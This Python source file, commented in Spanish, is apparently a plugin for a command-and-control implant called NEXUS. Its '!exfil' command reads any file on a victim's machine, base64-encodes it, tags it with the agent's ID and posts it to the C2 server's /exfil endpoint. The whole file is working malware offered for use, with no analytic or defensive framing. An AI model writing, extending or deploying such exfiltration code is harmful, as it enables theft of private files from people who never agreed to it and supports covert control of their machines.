"""
Plugin !exfil — exfiltra un archivo de la víctima al servidor C2.
!exfil <ruta>   → sube el archivo al servidor y lo guarda en exfil_files/
"""

import base64
import os

import requests

MAX_EXFIL_BYTES = 50 * 1024 * 1024  # 50 MB

SERVER_URL = os.environ.get("NEXUS_SERVER", "http://127.0.0.1:8080")
AGENT_ID_FILE = os.path.join(os.path.dirname(__file__), "..", "..", "agent_id.txt")


def _get_agent_id() -> str:
    try:
        with open(AGENT_ID_FILE) as f:
            return f.read().strip()
    except Exception:
        return "unknown"


def run(args: str) -> tuple[int, str, str]:
    path = args.strip()
    if not path:
        return 1, "", "uso: !exfil <ruta>"

    if not os.path.exists(path):
        return 1, "", f"no existe: {path}"
    if os.path.isdir(path):
        return 1, "", f"es un directorio, especifica un archivo: {path}"

    try:
        with open(path, "rb") as f:
            data = f.read()
    except PermissionError:
        return 1, "", f"sin permisos para leer: {path}"
    except Exception as exc:
        return 1, "", str(exc)

    size = len(data)
    if size > MAX_EXFIL_BYTES:
        return 1, "", f"archivo demasiado grande: {size} bytes (máx {MAX_EXFIL_BYTES // 1024 // 1024} MB)"

    filename = os.path.basename(path)
    payload = {
        "agent_id": _get_agent_id(),
        "filename": filename,
        "size": size,
        "data": base64.b64encode(data).decode(),
    }

    try:
        resp = requests.post(
            f"{SERVER_URL}/exfil",
            json=payload,
            timeout=30,
            headers={"Content-Type": "application/json"},
        )
        if resp.status_code == 200:
            return 0, f"Exfiltrado: {filename} ({size} bytes) → servidor C2", ""
        return 1, "", f"servidor rechazó el archivo: HTTP {resp.status_code}"
    except Exception as exc:
        return 1, "", f"error de conexión al servidor: {exc}"
